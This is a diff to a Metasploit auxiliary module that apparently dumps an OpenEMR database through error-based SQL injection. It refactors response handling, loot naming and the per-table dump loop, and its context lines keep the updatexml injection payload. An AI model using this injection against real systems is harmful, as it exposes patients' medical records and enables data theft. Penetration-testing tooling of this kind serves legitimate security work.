@@ -97,7 +97,7 @@ class MetasploitModule < Msf::Auxiliary
         'enc' => "1' and updatexml(1,concat(0x7e, (#{payload})),0) or '"
       }
     )
-    response.body
+    response
   end
 
   def parse_xpath_error(response_body)
@@ -108,7 +108,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def exec_payload_and_parse(payload)
-    parse_xpath_error(get_response(payload))
+    response = get_response(payload)
+    body = response.nil? ? '' : response.body
+    parse_xpath_error(body)
   end
 
   def complete_where_clause(where_clause, not_in_clause)
@@ -193,9 +195,10 @@ class MetasploitModule < Msf::Auxiliary
     data
   end
 
-  def save_csv(data, filename)
+  def save_csv(data, table)
+    safe_table = table.gsub(/[^0-9a-z]/i, '')
     store_loot(
-      'openemr.database.dump',
+      "openemr.database.#{safe_table}.dump",
       'application/CSV',
       rhost,
       data,
@@ -212,27 +215,18 @@ class MetasploitModule < Msf::Auxiliary
     num_tables = tables.length
     print_status("Identified #{num_tables} tables.")
 
-    count = 1
-    rand_token = Rex::Text.rand_text_alphanumeric(8)
-    dump_dir = File.join(Msf::Config.loot_directory, 'openemr-' + rand_token)
-    Dir.mkdir dump_dir
-    print_status("Created dump directory: #{dump_dir}")
-
     # These tables are impossible to fetch because they increase each request
     skiptables = %w[form_taskman log log_comment_encrypt]
-    tables.each do |table|
+    tables.each_with_index do |table, i|
       if skiptables.include?(table)
-        print_status("Skipping table (#{count}/#{num_tables}): #{table}")
+        print_status("Skipping table (#{i + 1}/#{num_tables}): #{table}")
       else
-        print_status("Dumping table (#{count}/#{num_tables}): #{table}")
+        print_status("Dumping table (#{i + 1}/#{num_tables}): #{table}")
         table_data = walk_table(table)
-        table_data_file_path = File.join(dump_dir, table + '.csv')
-        save_csv(table_data, table_data_file_path)
+        save_csv(table_data, table)
       end
-
-      count += 1
     end
-    print_status("Dumped all tables to #{dump_dir}")
+    print_status("Dumped all tables to #{Msf::Config.loot_directory}")
   end
 
   def run
